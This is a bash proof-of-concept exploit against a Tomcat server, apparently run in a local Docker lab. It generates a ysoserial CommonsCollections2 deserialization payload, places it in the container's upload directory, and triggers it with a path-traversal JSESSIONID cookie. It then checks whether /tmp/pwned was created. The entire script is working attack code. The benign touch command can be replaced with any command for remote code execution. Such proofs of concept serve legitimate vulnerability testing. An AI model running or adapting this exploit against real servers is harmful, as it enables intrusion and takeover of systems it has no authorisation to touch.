#!/bin/bash

# Variables
target_ip="localhost"
target_port=8080
file_name="payload.session"
payload_cmd="touch /tmp/pwned"
container_name="vulntomcatcontainer"

echo "Generating payload..."
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens=java.base/java.net=ALL-UNNAMED \
     --add-opens=java.base/java.util=ALL-UNNAMED \
     -jar ysoserial.jar CommonsCollections2 "$payload_cmd" > $file_name

echo "Uploading payload to container..."
docker cp $file_name $container_name:/usr/local/tomcat/upload/$file_name

echo "Triggering exploit..."
exploit_response=$(curl -s -X GET "http://$target_ip:$target_port/index.jsp" -H "Cookie: JSESSIONID=../../../../../usr/local/tomcat/upload/payload")
echo "Exploit response: $exploit_response"

echo "Checking if the file /tmp/pwned was created on the target server..."
docker exec -it $container_name ls /tmp